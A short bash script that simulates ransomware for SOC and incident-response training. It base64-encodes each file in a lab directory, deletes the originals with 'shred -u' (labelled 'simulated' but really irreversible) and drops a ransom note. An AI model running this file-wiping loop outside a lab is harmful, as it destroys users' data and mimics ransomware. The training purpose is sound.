#!/bin/bash

TARGET_DIR="/opt/malwarelab/dynamic"
NOTE="$TARGET_DIR/RANSOM_NOTE.txt"

echo "[*] Starting fake ransomware simulation..."

# Loop over each regular file (except the script itself and ransom note)
for file in "$TARGET_DIR"/*; do
    if [[ -f "$file" && "$file" != "$0" && "$file" != "$NOTE" ]]; then
        echo "[*] Encrypting $file"
        # Simulated encryption: base64 encode and overwrite
        base64 "$file" > "$file.enc"
        shred -u "$file"   # securely delete original (simulated)
    fi
done

# Drop a ransom note
cat <<EOF > "$NOTE"
Your files have been encrypted in this controlled lab simulation.

This is a SAFE ransomware test for SOC and incident response training.
No real data was harmed.

- Mridul's Malware Lab
EOF

echo "[*] Fake ransomware simulation completed."
